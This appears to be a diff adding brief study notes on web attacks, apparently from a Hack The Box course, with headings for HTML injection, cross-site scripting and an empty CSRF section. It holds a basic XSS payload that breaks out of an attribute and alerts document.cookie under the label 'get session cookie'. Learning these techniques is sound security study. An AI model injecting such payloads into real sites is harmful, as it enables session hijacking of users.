@@ -1,0 +1,9 @@
+# HTML Injection 
+# <a href="http://www.hackthebox.com">Click Me</a>
+
+# Cross-Site Scripting (XSS)
+# get session cookie
+#"><img src=/ onerror=alert(document.cookie)>
+
+# Cross-Site Request Forgery (CSRF)
+
